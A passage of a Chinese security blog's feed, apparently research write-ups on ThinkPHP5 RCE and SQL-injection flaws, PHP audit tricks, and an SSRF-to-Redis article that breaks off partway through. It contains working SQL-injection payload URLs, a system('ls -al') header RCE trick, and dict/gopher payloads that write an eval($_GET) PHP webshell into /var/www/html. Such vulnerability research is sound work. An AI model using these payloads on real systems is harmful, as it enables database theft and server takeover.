src="/img/tp5ldfxrce_m.png"></p><p><code>self::$debug</code>就是框架从配置文件中加载的值，所以关掉<code>app_debug</code>就不会调用到<code>param</code>方法了（淦）。那还有没有办法调用到呢？全局搜索可以看到当<code>App</code>类的<code>exec</code>方法中<code>$dispatch[&#39;type&#39;]</code>为<code>controller</code>或是<code>method</code>时就可以。</p><p><img src="/img/tp5ldfxrce_n.png"></p><p>于是继续跟进方法调用和变量传递：</p><p><img src="/img/tp5ldfxrce_o.png"></p><p><img src="/img/tp5ldfxrce_p.png"></p><p><img src="/img/tp5ldfxrce_q.png"></p><p><code>check</code>方法里面有点复杂。。。马后炮一下直接先看<code>parseRule</code>方法：</p><p><img src="/img/tp5ldfxrce_r.png"></p><p>需要<code>$route</code>为<code>\</code>或者<code>@</code>，继续回去跟进变量传递：</p><p><img src="/img/tp5ldfxrce_s.png"></p><p>TP5完整版或是通过<code>composer require topthink/think-captcha 1.*</code>安装的验证码扩展，会在<code>vendor/topthink/think-captcha/src/helper.php</code>中注册一条<code>get</code>路由。由于此处<code>$method</code>是通过<code>$request-&gt;method()</code>获取到的，所以能够通过$_POST传入<code>&amp;method=get</code>间接对其进行变量覆盖。</p><p><img src="/img/tp5ldfxrce_t.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/222672">ThinkPHP5.0.x RCE分析与利用</a></p><p><a href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">THINKPHP 5.X RCE 漏洞分析与利用总结</a></p><p><a href="https://www.anquanke.com/post/id/177173">天融信关于ThinkPHP5.1框架结合RCE漏洞的深入分析</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p><p><a href="https://paper.seebug.org/1377/">ThinkPHP 组件漏洞与攻击链分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境搭建基础可以参考SQL注入篇和官方文档&lt;/p&gt;
&lt;h2 id=&quot;代码执行1&quot;&gt;&lt;a href=&quot;#代码执行1&quot; class=&quot;headerlink&quot; title=&quot;代码执行1&quot;&gt;&lt;/a&gt;代码执行1&lt;/h2&gt;&lt;p&gt;通过传参可以调用任意类方法，调用一些具有回调功能的函数时可</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="rce" scheme="https://hosch3n.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析SQL注入篇</title>
    <link href="https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</id>
    <published>2020-10-21T13:12:12.000Z</published>
    <updated>2020-12-02T08:51:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。</p><ol start="0"><li>通过composer拉取项目</li></ol><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><ol><li>调整<code>composer.json</code>中的依赖为需要测试的具体版本</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li><p>执行<code>composer update</code>更新项目</p></li><li><p>创建mysql数据库</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;hoschen&#39;);</span><br><span class="line">create user tpdemo@localhost identified by &#39;passwd&#39;;</span><br><span class="line">grant all on tpdemo.* to tpdemo@localhost;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>配置<code>application/database.php</code>中对应参数</p></li><li><p>将<code>application/config.php</code>中的<code>app_debug</code>和<code>app_trace</code>改为<code>true</code>，用于回显错误</p></li><li><p>编写<code>application/index/controller/Index.php</code>模块的代码构造漏洞输入点</p></li></ol><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseData方法，将未过滤的用户输入拼接进insert/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.13&lt;=ThinkPHP&lt;=5.0.15</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.5</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;inc&amp;username[1]&#x3D;exp(~(select * from(select user())a))&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.18">5.0.16</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/091e7b734d4ce3e1288f47a7932a143fad73a4bd?branch=091e7b734d4ce3e1288f47a7932a143fad73a4bd&diff=split">改进inc/dec查询</a>这个commit</p><p><img src="/img/tp5ldfxsqli_a.png"></p><p>将源码版本更新为<code>5.0.15</code>，由<code>thinkphp/library/think/db/Builder.php</code>的113行可知触发这部分逻辑需要传入一个数组：</p><p><img src="/img/tp5ldfxsqli_b.png"></p><p>全局搜索对应的<code>parseData</code>方法，看到可以由718行的<code>insert</code>方法或是由823行的<code>update</code>方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request助手函数的get方法，获取$_GET[&#x27;username&#x27;]的数据</span></span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="comment">// 通过db助手函数的insert方法，传入username数组（上面/a修饰符表示数组类型）</span></span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="comment">// 也可以通过update方法</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;update([&#x27;username&#x27; =&gt; $username]);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>即对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，于是传入<code>username[0]=dec&amp;username[1]=a&amp;username[2]=1</code>进行动态调试，中间经过<code>parseKey</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_c.png"></p><p>显然<code>str_replace</code>函数是一个功能性函数，而并非是安全过滤函数，最终使得用户提供的数据被直接拼接进SQL语句中。</p><p>因为<code>username[0]</code>用于控制switch语句条件、<code>username[2]</code>会经过<code>floatval</code>函数强转，所以尝试通过<code>username[1]</code>传入报错注入Payload：</p><p><code>username[0]=dec&amp;username[1]=(extractvalue(1,concat(0x7e,(select user()),0x7e)))&amp;username[2]=1</code></p><p>得到报错：<code>1105 Only constant XPATH queries are supported</code>，XPATH系列用不了，换一种：</p><p><code>username[0]=dec&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))-1) &quot;</code></p><p><img src="/img/tp5ldfxsqli_d.png"></p><p><code>update</code>方法类似就不再赘述了，需要注意的是官方修复时仅处理了<code>inc</code>和<code>dec</code>条件，但是并没有改动同样在switch语句中的<code>exp</code>条件，原因是当<code>username[0]</code>为<code>exp</code>时，会被<code>thinkphp/library/think/Request.php</code>中1096行的<code>filterExp</code>方法替换为<code>exp[空格]</code>，最终因为不满足switch语句的任意条件被结束。</p><h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseArrayData方法，将未过滤的用户输入拼接进insert/insertAll/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.6&lt;=ThinkPHP&lt;=5.1.7、以及部分5.1.8</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;point&amp;username[1]&#x3D;a&amp;username[2]&#x3D;exp(~(select * from(select user())a))^&amp;username[3]&#x3D;a</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.13">5.1.9</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/39bb0fe6d50ee77e0779f646b10bce08c442a5e3">改进mysql驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_e.png"></p><p>直接删掉了<code>default</code>分支和<code>parseArrayData</code>方法。将源码版本更新为<code>5.1.17</code>，可以看到基本与SQL注入1逻辑相同。</p><p>全局搜索对应的<code>parseData</code>方法，看到可由1030行的<code>insert</code>方法、1063行的<code>insertAll</code>方法或是由1134行的<code>update</code>方法触发。需要编写的对应触发逻辑用SQL注入1的就行，而且多了一种触发方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insertAll方法接收一个二维数组</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;insertAll([[<span class="string">&#x27;username&#x27;</span> =&gt; $username]]);</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>依然对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，这次进入default分支跟进<code>parseArrayData</code>方法，看到需要让<code>username[0]</code>为<code>point</code>不然就会嗝屁：</p><p><img src="/img/tp5ldfxsqli_f.png"></p><p>因此传入<code>username[0]=point&amp;username[1]=a&amp;username[2]=b&amp;username[3]=c</code>进行动态调试，中间经过<code>parseData</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_g.png"></p><p>方便起见直接在<code>b</code>的位置传入报错注入Payload并闭合语句：</p><p><code>username[0]=point&amp;username[1]=a&amp;username[2]=exp(~(select * from(select user())a))^&amp;username[3]=a</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))^(&#39;a(a)&#39;)) &quot;</code></p><p><img src="/img/tp5ldfxsqli_h.png"></p><ul><li><code>update</code>和<code>insertAll</code>方法同理</li></ul><h2 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseWhereItem方法，将未过滤完全的用户输入拼接进where语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.10</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;anything&amp;username[2]&#x3D;)%20union%20select%20database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.14">5.0.11</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/495020b7b0c16de40f20b08f2ab3be0a2b816b96">改进Request类filterExp方法</a>这个commit，增加了对<code>not like</code>的过滤。</p><p><img src="/img/tp5ldfxsqli_j.png"></p><p>凡是使用框架提供的请求变量获取方法(Request类<code>param</code>方法及<code>input</code>助手函数)，都会经过这个<code>filterExp</code>方法的过滤。针对<code>not like</code>操作符，编写对应的<code>where</code>方法触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>相比前两个代码改动直接在漏洞点的补丁分析，这里的代码改动是在全局过滤函数的规则上，该如何根据这个变动敏感地嗅探到能被利用漏洞点呢？这是需要之后进一步思考的地方。</p><p>带着这个问题动态调试可以发现，输入流过程中有很多针对数组的解析函数，也会理解Payload要这样构造的原因：当然就是要满足一些if判断逻辑，让输入流进入到预期漏洞代码块了hhh（废话）</p><p><img src="/img/tp5ldfxsqli_k.png"></p><ul><li>因为PHP7的原因，需要调整一下implode函数的参数顺序</li></ul><p><img src="/img/tp5ldfxsqli_l.png"></p><p>一波拼接操作后生成的<code>whereStr</code>为<code>&quot;(`username` NOT LIKE &#39;%%&#39; ) UNION SELECT DATABASE(),USER()# `username` NOT LIKE &#39;anything&#39;)&quot;</code></p><p>这样就能让<code>username</code>字段匹配不到NULL之外的值避免占据回显点位，同时注释掉后面被implode函数合并进来的副作用语句，避免语法错误。</p><p>最终带入数据库执行的SQL语句为：</p><p><img src="/img/tp5ldfxsqli_m.png"></p><p>官方在个版本里新引入了<code>NOT LIKE</code>这个操作符，但是没加上对应的过滤规则导致了漏洞的产生。</p><h2 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h2><p>特定模式（<code>exp</code>）下的SQL语句执行：</p><p>影响版本：</p><ul><li>全版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username&#x3D;) union select database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里官方认为属于正常功能不作修复，因此不存在补丁更新对比。编写对应触发逻辑来调试分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p><img src="/img/tp5ldfxsqli_i.png"></p><p>流程与上一个洞类似就不赘述了，查看《ThinkPHP5.0完全开发手册》193页可以看到说明了<code>exp</code>模式就是用作SQL语法模式的，所以我个人觉得官方不认为这是一个漏洞也在情理之中。</p><h2 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseOrder方法，将未过滤的用户输入拼接进select/update/delete语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.16&lt;=ThinkPHP&lt;=5.1.22</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;orderby[id&#96;|updatexml(1,concat(0x7e,(select user()),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.23</a>版本更新说明中表示改进了order方法的数组方式解析增强安全性，具体看到<a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">改进order方法解析</a>这个commit</p><p><img src="/img/tp5ldfxsqli_n.png"></p><p>增加了对<code>)</code>和<code>#</code>符号的判断。将源码版本更新为<code>5.1.22</code>，全局搜索<code>parseOrder</code>方法，看到可以由1037行的select方法、1170行的update方法或是由1206行的delete方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$orderby = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line"><span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;])-&gt;order($orderby)-&gt;find();</span></span><br><span class="line"><span class="comment">// 也可以通过update方法，</span></span><br><span class="line"><span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;order($orderby)-&gt;update([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;]);</span></span><br><span class="line"><span class="comment">// 还可以通过delete方法，支持XPATH系列函数</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;order($orderby)-&gt;delete();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>这里传入Payload动态调试后可以发现拼接而成的SQL语句为：<code>&quot;DELETE FROM `users` WHERE  `id` = :where_AND_id ORDER BY `id`|updatexml(1,concat(0x7e,(select user()),0x7e),1)#` &quot; </code></p><p>为啥这里用的delete方法？因为在我的环境下前两种方法都会得到报错：<code>1105 Only constant XPATH queries are supported</code>，而通过exp等函数整数溢出报错也无效，希望知道原因的师傅指点我一下。</p><h2 id="SQL注入6"><a href="#SQL注入6" class="headerlink" title="SQL注入6"></a>SQL注入6</h2><p>聚合查询方法将未过滤的用户输入拼接进SQL语句中，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP&lt;=5.0.21</li><li>5.1.3&lt;=ThinkPHP&lt;=5.1.25</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 5.1.11～5.1.25需要改为 id&#96;)</span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.26</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">改进mysql驱动和sqlsrv驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_o.png"></p><p>只允许字母、数字、下划线、点号、星号，不然抛出异常。</p><ul><li>因为对框架不熟悉，想根据这类补丁对比找出具体的漏洞发生点实在是困难，得多学习历史漏洞积累经验才行。这里也由于暂未复现成功，只能先搁置一下了</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础设施&quot;&gt;&lt;a href=&quot;#基础设施&quot; class=&quot;headerlink&quot; title=&quot;基础设施&quot;&gt;&lt;/a&gt;基础设施&lt;/h2&gt;&lt;p&gt;大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。&lt;/p&gt;
&lt;ol start=&quot;0&quot;&gt;
</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="sqli" scheme="https://hosch3n.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计Tricks</title>
    <link href="https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/"/>
    <id>https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/</id>
    <published>2020-10-15T13:09:19.000Z</published>
    <updated>2020-12-07T14:43:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反序列化调用不到类"><a href="#反序列化调用不到类" class="headerlink" title="反序列化调用不到类"></a>反序列化调用不到类</h2><p><img src="/img/phpdmsjtricks_a.png"></p><p>希望调用<code>ws.php</code>中<code>CLI\Agent</code>类的析构函数，但是传入<code>new CLI\Agent()</code>的序列化字符串后并未触发<code>die</code>标记，通过动态调试发现该框架此时会去寻找<code>lib/cli/agent.php</code>（但实际上是<code>Agent</code>类与<code>WS</code>类一起写在了<code>ws.php</code>中）</p><p><img src="/img/phpdmsjtricks_b.png"></p><p>解决方法是生成序列化字符串时，通过数组<code>array(new CLI\WS(), new CLI\Agent())</code>将两个类对象按顺序一同传入。这样虽然<code>autoload</code>包含<code>agent.php</code>同样会失败，但能够包含到<code>ws.php</code>也就能成功反序列化里面的<code>Agent</code>类。</p><ul><li>也看到了通过<code>new \CLI\WS(new \CLI\Agent())</code>的形式解决的</li></ul><h2 id="函数无参数RCE"><a href="#函数无参数RCE" class="headerlink" title="函数无参数RCE"></a>函数无参数RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTTP Header</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">key: system(&#x27;ls -al&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><h2 id="链中的函数参数对应不上"><a href="#链中的函数参数对应不上" class="headerlink" title="链中的函数参数对应不上"></a>链中的函数参数对应不上</h2><p>通过PHP编写的一些自定义函数，如果一些非关键参数缺失或者多余其实影响不大。但是PHP的内置函数可能是因为由C实现的原因，兼容性就没那么高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;反序列化调用不到类&quot;&gt;&lt;a href=&quot;#反序列化调用不到类&quot; class=&quot;headerlink&quot; title=&quot;反序列化调用不到类&quot;&gt;&lt;/a&gt;反序列化调用不到类&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/phpdmsjtricks_a.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="https://hosch3n.github.io/tags/php/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>SSRF打Redis规避坏字符</title>
    <link href="https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/"/>
    <id>https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/</id>
    <published>2020-09-24T16:43:14.000Z</published>
    <updated>2020-11-23T08:13:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>用dict协议通过SSRF间接打Redis的时候，数据中存在<code>:</code>、<code>&#39;</code>等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>对存在特殊字符的数据进行位运算，再在目标Redis上通过位运算将数据还原回来。<a href="https://redis.io/commands/bitop">举个栗子</a>：</p><p><img src="/img/ssrfdredisgbhzf_a.png"></p><ol start="0"><li>利用抑或的特性先set两个不会与dict协议冲突的字符串</li></ol><p><code>dict://127.0.0.1:6379/set:c:&quot;|\x7f&#125;%6!,hd\x1f\a\x05\x14\x1byqq\x1di&#123;\x7f~&quot;</code></p><p><code>dict://127.0.0.1:6379/set:b:&#39;@@@@@@@@@@@@@@@@@@@@@@&#39;</code></p><ol><li>再在目标上还原</li></ol><p><code>dict://127.0.0.1:6379/bitop:xor:a:b:c</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><p><img src="/img/ssrfdredisgbhzf_b.png"></p><h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><p>对redis-cli的命令数据抓包，利用gopher协议封装后重放给目标Redis。由于Redis的授权认证只有简单的一串<code>*2%0A%244%0Aauth%0A%248%0Afoobared</code>，且可以通过管道操作一次同时传输多条命令，因此这个方法还可以用来打知道密码的内网Redis。</p><ol start="0"><li>监听环回口6379端口并抓包</li></ol><p><code>sudo tcpdump port 6379 -i lo -w redis.pcap</code></p><p><img src="/img/ssrfdredisgbhzf_c.png"></p><ol><li>用gopher协议编码封装</li></ol><p><code>gopher://127.0.0.1:6379/_%244%0d%0aauth%0d%0a%248%0d%0afoobared%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0aa%0d%0a%2422%0d%0a%3C%3F%3Deval(%24_GET%5B911%5D)%3B%3F%3E%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2414%0d%0a%2Fvar%2Fwww%2Fhtml%2F%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0atmp.php%0d%0a*1%0d%0a%246%0d%0abgsave</code></p><ol 